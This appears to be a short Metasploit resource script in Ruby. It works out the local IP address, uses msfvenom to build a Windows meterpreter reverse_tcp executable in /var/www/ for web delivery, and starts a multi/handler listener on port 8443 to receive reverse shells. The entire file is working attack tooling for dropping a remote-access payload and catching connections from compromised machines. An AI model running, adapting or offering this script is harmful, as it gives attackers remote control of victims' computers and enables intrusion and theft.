<ruby>
def local_ip
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true 
	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		s.addr.last
	end
ensure
	Socket.do_not_reverse_lookup = orig
end
lhost = local_ip()
lport = 8443
format = "exe"
print_good("Generating payload in /var/www/...")
system("msfvenom -p windows/meterpreter/reverse_tcp lhost=#{lhost} lport=#{lport} -f #{format} > /var/www/smp_#{lport}.#{format}")
print_good("Payload: #{`ls /var/www/smp_*.#{format}`}")
self.run_single("use exploit/multi/handler")
self.run_single("set payload windows/meterpreter/reverse_tcp")
self.run_single("set lport #{lport}")
self.run_single("set lhost #{lhost}")
self.run_single("exploit -z -j")

</ruby>

